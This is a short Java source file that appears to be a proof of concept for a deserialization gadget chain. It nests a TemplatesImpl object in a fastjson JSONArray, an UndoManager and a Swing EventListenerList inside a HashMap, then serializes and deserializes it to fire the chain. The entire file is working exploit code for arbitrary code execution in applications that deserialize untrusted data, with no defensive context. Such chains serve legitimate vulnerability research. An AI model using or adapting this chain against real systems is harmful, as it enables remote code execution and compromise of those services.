package com.jdk;

import com.alibaba.fastjson.JSONArray;
import com.example.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.util.Vector;
import java.util.HashMap;


public class EventListenerListChain {
    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = Utils.getTemplatesImpl();
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(obj);

        EventListenerList eventListenerList = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector vector = (Vector) Utils.getFieldValue(undoManager, "edits");
        vector.add(jsonArray);
        Utils.SetValue(eventListenerList, "listenerList", new Object[]{InternalError.class, undoManager});

        HashMap hashMap = new HashMap();
        hashMap.put(obj,eventListenerList);

        String barr = Utils.Serialize(hashMap);
        System.out.println(barr);
        Utils.UnSerialize(barr);
    }
}
